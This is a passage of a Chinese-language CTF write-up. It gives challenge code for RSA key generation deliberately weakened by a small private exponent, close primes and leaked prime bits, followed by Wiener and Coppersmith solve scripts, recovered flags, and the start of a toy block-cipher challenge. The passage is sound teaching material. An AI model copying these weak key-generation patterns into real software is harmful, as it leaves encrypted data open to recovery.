class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">size</span>):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                q = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> q &lt; p &lt; <span class="number">2</span>*q:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            max_d = isqrt(isqrt(N)) // <span class="number">3</span></span><br><span class="line">            max_d_bits = max_d.bit_length() - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                d = getRandomNBitInteger(max_d_bits)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    e = <span class="built_in">int</span>(inverse(d, phi))</span><br><span class="line">                <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    k=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(p+k):</span><br><span class="line">            <span class="keyword">return</span> p+k</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">creat_keypair</span>(<span class="params">nbits, beta</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = next_prime(p+getRandomNBitInteger(<span class="built_in">int</span>(nbits*beta)))</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                e = getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> GCD(e, phi) == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = creat_keypair(<span class="number">1024</span>, <span class="number">0.25</span>)</span><br><span class="line">        self.m = chall2_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">nbits</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            e = <span class="number">65537</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            leak = p &gt;&gt; <span class="number">253</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d, leak</span><br><span class="line">        self.N, self.e, self.d, self.leak = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e, <span class="string">&quot;leak&quot;</span>:self.leak&#125;</span><br></pre></td></tr></table></figure></blockquote><p>求解三层RSA拿flag。</p><p>第一层，$q&lt;p&lt;2q,d&lt;\cfrac{1}{3}N^{\frac{1}{4}}$，满足Wiener Attack条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factor_rsa_wiener</span>(<span class="params">N, e</span>):</span><br><span class="line">    N = Integer(N)</span><br><span class="line">    e = Integer(e)</span><br><span class="line">    cf = (e / N).continued_fraction().convergents()</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> cf:</span><br><span class="line">        k = f.numer()</span><br><span class="line">        d = f.denom()</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi_N = ((e * d) - <span class="number">1</span>) / k</span><br><span class="line">        b = -(N - phi_N + <span class="number">1</span>)</span><br><span class="line">        dis = b ^ <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">        <span class="keyword">if</span> dis.sign() == <span class="number">1</span>:</span><br><span class="line">            dis_sqrt = sqrt(dis)</span><br><span class="line">            p = (-b + dis_sqrt) / <span class="number">2</span></span><br><span class="line">            q = (-b - dis_sqrt) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> p.is_integer() <span class="keyword">and</span> q.is_integer() <span class="keyword">and</span> (p * q) % N == <span class="number">0</span>:</span><br><span class="line">                p = p % N</span><br><span class="line">                q = q % N</span><br><span class="line">                <span class="keyword">if</span> p &gt; q:</span><br><span class="line">                    <span class="keyword">return</span> (p, q)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> (q, p)</span><br><span class="line"></span><br><span class="line">N = <span class="number">137549711547277501490512652253223705009896739033213206450427185227633740625388392382604507796908923883409603222056205390907355567345203551544782114279172864959402320300753748333020687530365352630647687557310169459736318329569719516536939612675375837585785285970788429934265825996569888095986259096503876786157</span></span><br><span class="line">e = <span class="number">93353589564181636718027173778502268418513041301835540045681119331234573983360292187550959060357949657609295815897069024673722589144338487101058734688906424145037973559780521703111302989561973563657725186914522917495401111500951519775376691911667795239110869653121682582184013495282531768528802139272651917441</span></span><br><span class="line">c = <span class="number">0x24e544c4b398ed0812a1739127c026d2b8eeba2b1e5c9221a6debaa9ebfeb134c6dfcbcf3142ec2723b6990d25d4bb0d7f14e4034c4a8be71d46015e6ae65cc8e1872f62860e5b89cd59f48420e9a3e85dcbdf34c850688046026fcf4ffb504baef704ff049f49494bbfb05624a30c542051fada959dff52fefc378489e20c60</span></span><br><span class="line">p, q = factor_rsa_wiener(N, e)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;wiener_attack_easily!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>第二层，已知 $p$ 高位攻击+ $\gcd(e,\varphi)=2$ 情形，coppersmith+AMM算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">N = <span class="number">68414473664421192639324860086304622601462638941429703900601142401666806262479832339441486761549640560858310048110541758196980937681745306684526118613694088585953109432823793467906611480953093877867597017269693809377188442523548160628479089952031515541299395812090799992365148053327937407652550818853770241959</span></span><br><span class="line">e = <span class="number">62830</span></span><br><span class="line">c = <span class="number">0x520ba82a569ea52f16b84c4415186cd616680131e3ac6eda886fea046b18b0e1326d4acbbfb8840dc8064211cd44c30b91148836048434a3f57dd4ec5a5cdaf005a0f8f2c95ee7d9a739505b01e407acd3441dd088f64a2a0c36e43c520e30bd90bb32ec1125e4bb1f4e7d522596898da22c9a7921ac5da96808ee39c98e131f</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line">find = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**i):</span><br><span class="line">        p4 = Integer(gmpy2.iroot(N,<span class="number">2</span>)[<span class="number">0</span>])&gt;&gt;<span class="number">256</span></span><br><span class="line">        p4 = (p4&lt;&lt;i) + j</span><br><span class="line">        kbits = pbits - p4.nbits()</span><br><span class="line">        p4 = p4 &lt;&lt; kbits</span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">        f = x + p4</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">            <span class="keyword">if</span> N%p == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                find = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> find == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">q = N // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e//<span class="number">2</span>,f)</span><br><span class="line">cc = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^<span class="number">2</span>-cc</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^<span class="number">2</span>-cc</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = <span class="built_in">hex</span>(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(solution) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(solution))</span><br><span class="line"><span class="comment"># b&#x27;how_to_solve_e_and_phi_uncoprime_condision&#x27;</span></span><br></pre></td></tr></table></figure><p>第三层，已知 $p$ 高位攻击，但泄露位数过少，位爆破+调节参数扩大格范围。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057</span></span><br><span class="line"></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">p4 = <span class="number">531320819410375258952658395582915285878636410772332266245849790153420724865787</span>&lt;&lt;(<span class="number">253</span>-<span class="number">248</span>)</span><br><span class="line">p4 = p4 + i</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(i,p)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7d</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;now_you_know_how_to_use_coppersmith&#x27;</span></span><br></pre></td></tr></table></figure><p>三次提交正确得flag：<code>hgame&#123;U_mus7_b3_RS4_M@ster!!!&#125;</code>。</p><p>​    </p><h3 id="ezBlock"><a href="#ezBlock" class="headerlink" title="ezBlock"></a>ezBlock</h3><blockquote><p>兔兔拜年的时候遇到了 yolande ，yolande 说她之前在写差分攻击脚本，问兔兔要不要学习一下，还说如果遇到问题可以看看 The Block Cipher Companion.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + f + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]</span></span><br></pre></td></tr></table></figure></blockquote><p>正常考点应该是四轮S盒差分攻击，<code>xxxx_xxxx_xxxx_xxxx_xxxx</code> 分割得到5组key，测试发现5组key的每4位（每1个16进制数）为一组作为输入，得到的输出是固定不变的，采用爆破方式可解，所需遍历次数为 $4 \cdot 16^5=4194304$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">m = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c = [<span class="number">28590</span>, <span class="number">33943</span>, <span class="number">30267</span>, <span class="number">5412</span>, <span class="number">11529</span>, <span class="number">3089</span>, <span class="number">46924</span>, <span class="number">59533</span>, <span class="number">12915</span>, <span class="number">37743</span>, <span class="number">64090</span>, <span class="number">53680</span>, <span class="number">18933</span>, <span class="number">49378</span>, <span class="number">23512</span>, <span class="number">44742</span>]</span><br><span class="line">m = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> m]</span><br><span class="line">c = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">m = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> m] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> c] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span 